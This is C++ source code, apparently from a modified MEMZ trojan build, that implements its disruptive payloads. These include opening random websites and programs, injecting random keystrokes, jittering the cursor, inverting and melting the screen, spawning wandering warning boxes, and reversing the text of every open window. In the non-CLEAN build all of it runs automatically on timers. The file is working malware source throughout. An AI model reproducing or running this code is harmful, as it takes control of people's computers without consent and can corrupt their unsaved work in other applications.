#include "memz.h"
#include <math.h>

// Declare global variables from main.cpp
extern int nMonitors;
extern int scrx, scry, scrw, scrh;

PAYLOAD payloads[] = {
#ifdef CLEAN
    { payloadExecute,    L"\x6253\x5F00\x968F\x673A\x7F51\x7AD9/\x7A0B\x5E8F", NULL, 0,0,0,0, FALSE },
    { payloadCursor,     L"\x5149\x6807\x968F\x673A\x6296\x52A8",               NULL, 0,0,0,0, TRUE  },
    { payloadKeyboard,   L"\x968F\x673A\x952E\x76D8\x8F93\x5165",               NULL, 0,0,0,0, FALSE },
    { payloadSound,      L"\x968F\x673A\x9519\x8BEF\x58F0\x97F3",               NULL, 0,0,0,0, TRUE  },
    { payloadBlink,      L"\x5C4F\x5E55\x95EA\x70C1",                           NULL, 0,0,0,0, TRUE  },
    { payloadMessageBox, L"\x5F39\x51FA\x6D88\x606F\x6846",                     NULL, 0,0,0,0, TRUE  },
    { payloadDrawErrors, L"\x7ED8\x5236\x9519\x8BEF\x56FE\x6807",               NULL, 0,0,0,0, TRUE  },
    { payloadChangeText, L"\x53CD\x8F6C\x6587\x672C",                           NULL, 0,0,0,0, FALSE },
    { payloadPIP,        L"\x96A7\x9053\x6548\x679C",                           NULL, 0,0,0,0, TRUE  },
    { payloadPuzzle,     L"\x5C4F\x5E55\x6545\x969C",                           NULL, 0,0,0,0, TRUE  }
#else
    { payloadExecute,    30000 },
    { payloadCursor,     30000 },
    { payloadKeyboard,   20000 },
    { payloadSound,      50000 },
    { payloadBlink,      30000 },
    { payloadMessageBox, 20000 },
    { payloadDrawErrors, 10000 },
    { payloadChangeText, 40000 },
    { payloadPIP,        60000 },
    { payloadPuzzle,     15000 }
#endif
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

// Audio level: 0.0 (silent) to 1.0 (loud). Updated by audioThread.
volatile float gAudioLevel = 0.0f;

// ─────────────────────────────────────────────────────────────────────────────
// DC / coordinate helpers
//
// COORDINATE SYSTEM (System DPI Aware mode):
//
// In "System DPI Aware" mode Windows uses a single logical coordinate space
// scaled to the PRIMARY monitor's DPI for all API calls:
//   - GetMonitorInfo / EnumDisplayMonitors  → logical coords
//   - GetDC(NULL) drawing                  → logical coords
//   - GetCursorPos / SetWindowPos          → logical coords
//
// Therefore all coordinates from rcMonitor and GetDC(NULL) are in the same
// space and can be used directly without any conversion.
//
// getTargetOriginX/Y  → logical top-left of the target monitor
// getTargetW/H        → logical width/height of the target monitor
// getTargetDC()       → GetDC(NULL), draws in logical coords
//
// All payload drawing: use (ox + local_x, oy + local_y) as absolute coords.
// ─────────────────────────────────────────────────────────────────────────────

static WCHAR g_deviceName[32] = L"\\\\.\\DISPLAY1";

void setTargetDeviceName(int idx) {
    extern MONINFO monitors[];
    extern int nMonitors;
    if (idx >= 0 && idx < nMonitors)
        lstrcpyW(g_deviceName, monitors[idx].deviceName);
    else
        lstrcpyW(g_deviceName, L"");
}

static int getTargetOriginX() {
    int idx = getTargetMonitorIdx();
    if (idx >= 0 && idx < nMonitors) return monitors[idx].rect.left;
    return scrx;
}
static int getTargetOriginY() {
    int idx = getTargetMonitorIdx();
    if (idx >= 0 && idx < nMonitors) return monitors[idx].rect.top;
    return scry;
}
static int getTargetW() {
    int idx = getTargetMonitorIdx();
    if (idx >= 0 && idx < nMonitors)
        return monitors[idx].rect.right - monitors[idx].rect.left;
    return scrw;
}
static int getTargetH() {
    int idx = getTargetMonitorIdx();
    if (idx >= 0 && idx < nMonitors)
        return monitors[idx].rect.bottom - monitors[idx].rect.top;
    return scrh;
}

// getTargetDC: GetDC(NULL) gives a DC whose coordinate space matches
// the logical coordinates returned by GetMonitorInfo in System DPI Aware mode.
HDC getTargetDC() {
    return GetDC(NULL);
}
void releaseTargetDC(HDC hdc) {
    ReleaseDC(NULL, hdc);
}

// ─────────────────────────────────────────────────────────────────────────────
// Audio capture thread using WASAPI loopback
// ─────────────────────────────────────────────────────────────────────────────
#include <audioclient.h>
#include <mmdeviceapi.h>

DWORD WINAPI audioThread(LPVOID lParam) {
    CoInitialize(NULL);
    IMMDeviceEnumerator *pEnum = NULL;
    IMMDevice           *pDevice = NULL;
    IAudioClient        *pClient = NULL;
    IAudioCaptureClient *pCapture = NULL;
    WAVEFORMATEX        *pwfx = NULL;

    if (FAILED(CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL,
            __uuidof(IMMDeviceEnumerator), (void**)&pEnum))) goto cleanup;
    if (FAILED(pEnum->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice))) goto cleanup;
    if (FAILED(pDevice->Activate(__uuidof(IAudioClient), CLSCTX_ALL, NULL, (void**)&pClient))) goto cleanup;
    if (FAILED(pClient->GetMixFormat(&pwfx))) goto cleanup;
    if (FAILED(pClient->Initialize(AUDCLNT_SHAREMODE_SHARED,
            AUDCLNT_STREAMFLAGS_LOOPBACK, 10000000, 0, pwfx, NULL))) goto cleanup;
    if (FAILED(pClient->GetService(__uuidof(IAudioCaptureClient), (void**)&pCapture))) goto cleanup;
    pClient->Start();

    for (;;) {
        Sleep(20);
        UINT32 packetSize = 0;
        if (FAILED(pCapture->GetNextPacketSize(&packetSize))) break;
        float maxLevel = 0.0f;
        while (packetSize > 0) {
            BYTE *pData = NULL; UINT32 numFrames = 0; DWORD flags = 0;
            if (FAILED(pCapture->GetBuffer(&pData, &numFrames, &flags, NULL, NULL))) break;
            if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT) && pwfx->wBitsPerSample == 32) {
                float *s = (float*)pData; int n = numFrames * pwfx->nChannels;
                float sum = 0.0f;
                for (int i = 0; i < n; i++) sum += s[i]*s[i];
                float rms = (float)sqrt(sum/n);
                if (rms > maxLevel) maxLevel = rms;
            } else if (!(flags & AUDCLNT_BUFFERFLAGS_SILENT) && pwfx->wBitsPerSample == 16) {
                short *s = (short*)pData; int n = numFrames * pwfx->nChannels;
                float sum = 0.0f;
                for (int i = 0; i < n; i++) { float v = s[i]/32768.0f; sum += v*v; }
                float rms = (float)sqrt(sum/n);
                if (rms > maxLevel) maxLevel = rms;
            }
            pCapture->ReleaseBuffer(numFrames);
            if (FAILED(pCapture->GetNextPacketSize(&packetSize))) goto cleanup;
        }
        if (maxLevel > 1.0f) maxLevel = 1.0f;
        float alpha = (maxLevel > gAudioLevel) ? 0.6f : 0.1f;
        gAudioLevel = gAudioLevel * (1.0f - alpha) + maxLevel * alpha;
    }
cleanup:
    if (pCapture) pCapture->Release();
    if (pClient)  { pClient->Stop(); pClient->Release(); }
    if (pDevice)  pDevice->Release();
    if (pEnum)    pEnum->Release();
    if (pwfx)     CoTaskMemFree(pwfx);
    CoUninitialize();
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
// Payload thread
// ─────────────────────────────────────────────────────────────────────────────
DWORD WINAPI payloadThread(LPVOID parameter) {
#ifndef CLEAN
    int delay = 0, times = 0, runtime = 0;
#endif
    PAYLOAD *payload = (PAYLOAD*)parameter;
    for (;;) {
#ifdef CLEAN
        if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
            if (payload->delaytime++ >= payload->delay) {
                payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
                payload->delaytime = 0;
            }
            payload->runtime++;
        } else {
            payload->runtime = 0;
            payload->times   = 0;
            payload->delay   = 0;
        }
#else
        if (delay-- == 0) delay = (payload->payloadFunction)(times++, runtime);
        runtime++;
#endif
        Sleep(10);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Payloads
// All drawing uses ABSOLUTE logical-screen coordinates: (ox + local_x, oy + local_y)
// where ox = getTargetOriginX(), oy = getTargetOriginY()
// ─────────────────────────────────────────────────────────────────────────────

int payloadExecute(PAYLOADFUNC) {
    PAYLOADHEAD
    ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);
    out: return (int)(1500.0 / (times / 15.0 + 1) + 100 + (random() % 200));
}

int payloadBlink(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        PatBlt(hdc, ox, oy, tw, th, PATINVERT);
        releaseTargetDC(hdc);
        float lvl = gAudioLevel;
        int delay = (int)(100.0f * (1.0f - lvl * 0.7f));
        if (delay < 10) delay = 10;
        return delay;
    }
    out: return 100;
}

int payloadCursor(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        POINT cursor;
        GetCursorPos(&cursor);
        float lvl = gAudioLevel;
        int maxJitter = (int)(2 + lvl * 12);
        int jx = (random() % 3 - 1) * (random() % (runtime / 2200 + 2) + (int)(lvl * maxJitter));
        int jy = (random() % 3 - 1) * (random() % (runtime / 2200 + 2) + (int)(lvl * maxJitter));
        SetCursorPos(cursor.x + jx, cursor.y + jy);
    }
    out: return 2;
}

int payloadMessageBox(PAYLOADFUNC) {
    PAYLOADHEAD
    CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
    out: return (int)(800.0 / (times / 5.0 + 1) + 10 + (random() % 20));
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
    MessageBoxW(NULL,
        L"\x4F60\x8FD8\x5728\x7528\x8FD9\x53F0\x7535\x8111\x5417\xFF1F",
        L"\x7F51\x597D\x5361\x83CC",
        MB_OK | MB_ICONWARNING);
    UnhookWindowsHookEx(hook);
    return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_ACTIVATE) {
        HWND hwnd = (HWND)wParam;
        RECT wr;
        GetWindowRect(hwnd, &wr);
        int cx = wr.right - wr.left;
        int cy = wr.bottom - wr.top;
        if (cx <= 0) cx = 300;
        if (cy <= 0) cy = 150;
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(),       th = getTargetH();
        int rangeW = tw - cx; if (rangeW < 1) rangeW = 1;
        int rangeH = th - cy; if (rangeH < 1) rangeH = 1;
        int nx = ox + random() % rangeW;
        int ny = oy + random() % rangeH;
        SetWindowPos(hwnd, HWND_TOPMOST, nx, ny, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE);
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}

int payloadChangeText(PAYLOADFUNC) {
    PAYLOADHEAD
    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
    out: return 50;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
        strReverseW(str);
        SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
    }
    GlobalFree(str);
    return TRUE;
}

int payloadSound(PAYLOADFUNC) {
    PAYLOADHEAD
#ifdef CLEAN
    PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
    out: return random() % 10;
#else
    PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_ASYNC);
    out: return 20 + (random() % 20);
#endif
}

int payloadPuzzle(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        HDC hdc = getTargetDC();
        float lvl = gAudioLevel;
        int maxW = (int)(50 + lvl * 550);
        int maxH = (int)(50 + lvl * 550);
        if (maxW > tw) maxW = tw;
        if (maxH > th) maxH = th;

        // All coords are absolute logical: ox + local
        int x1 = ox + random() % (tw - maxW + 1);
        int y1 = oy + random() % (th - maxH + 1);
        int x2 = ox + random() % (tw - maxW + 1);
        int y2 = oy + random() % (th - maxH + 1);
        int w  = random() % maxW + 1;
        int h  = random() % maxH + 1;
        if (x1 - ox + w > tw) w = tw - (x1 - ox);
        if (y1 - oy + h > th) h = th - (y1 - oy);
        if (x2 - ox + w > tw) w = tw - (x2 - ox);
        if (y2 - oy + h > th) h = th - (y2 - oy);
        if (w < 1) w = 1;
        if (h < 1) h = 1;
        BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, SRCCOPY);
        releaseTargetDC(hdc);
        int delay = (int)(200.0 / (times / 5.0 + 1) + 3);
        delay = (int)(delay * (1.0f - lvl * 0.8f));
        if (delay < 1) delay = 1;
        return delay;
    }
    out: return (int)(200.0 / (times / 5.0 + 1) + 3);
}

int payloadKeyboard(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        INPUT input = {};
        input.type   = INPUT_KEYBOARD;
        input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
        SendInput(1, &input, sizeof(INPUT));
    }
    out: return 300 + (random() % 400);
}

// payloadPIP: tunnel/collapse effect.
// Each frame captures the target monitor and draws it shrunken back,
// creating a continuous recursive tunnel collapse.
int payloadPIP(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(), th = getTargetH();
        float lvl = gAudioLevel;

        // Inset grows each frame — drives the continuous collapse
        int inset = (int)(2 + (times / 10) + lvl * 20);
        if (inset > tw / 3) inset = tw / 3;
        if (inset > th / 3) inset = th / 3;
        int dstW = tw - 2 * inset;
        int dstH = th - 2 * inset;
        if (dstW < 4) dstW = 4;
        if (dstH < 4) dstH = 4;

        // Capture target monitor region from the desktop DC into an off-screen bitmap.
        // In System DPI Aware mode, GetDC(NULL) and rcMonitor coords are in the same
        // logical coordinate space, so (ox, oy) maps correctly to the target monitor.
        HDC desktopDC = GetDC(NULL);
        HDC memDC = CreateCompatibleDC(desktopDC);
        HBITMAP hBmp = CreateCompatibleBitmap(desktopDC, tw, th);
        HBITMAP hOld = (HBITMAP)SelectObject(memDC, hBmp);
        SetStretchBltMode(desktopDC, HALFTONE);
        BitBlt(memDC, 0, 0, tw, th, desktopDC, ox, oy, SRCCOPY);

        // Draw shrunken image back onto the desktop at the inset position
        StretchBlt(desktopDC,
                   ox + inset, oy + inset, dstW, dstH,
                   memDC, 0, 0, tw, th, SRCCOPY);

        SelectObject(memDC, hOld);
        DeleteObject(hBmp);
        DeleteDC(memDC);
        ReleaseDC(NULL, desktopDC);
    }
    out: return 16;
}

int payloadDrawErrors(PAYLOADFUNC) {
    PAYLOADHEAD
    {
        int ix = GetSystemMetrics(SM_CXICON) / 2;
        int iy = GetSystemMetrics(SM_CYICON) / 2;
        int ox = getTargetOriginX(), oy = getTargetOriginY();
        int tw = getTargetW(),       th = getTargetH();
        HDC hdc = getTargetDC();
        POINT cursor;
        GetCursorPos(&cursor);
        // cursor is in logical virtual-screen coords — same space as ox/oy
        int lx = cursor.x - ox;
        int ly = cursor.y - oy;
        if (lx >= 0 && lx < tw && ly >= 0 && ly < th)
            DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
        float lvl = gAudioLevel;
        int extraIcons = (int)(lvl * 5);
        if (random() % (int)(10/(times/500.0+1)+1) == 0 || extraIcons > 0) {
            int n = 1 + extraIcons;
            for (int i = 0; i < n; i++)
                DrawIcon(hdc,
                         ox + random() % tw,
                         oy + random() % th,
                         LoadIcon(NULL, IDI_WARNING));
        }
        releaseTargetDC(hdc);
    }
    out: return 2;
}
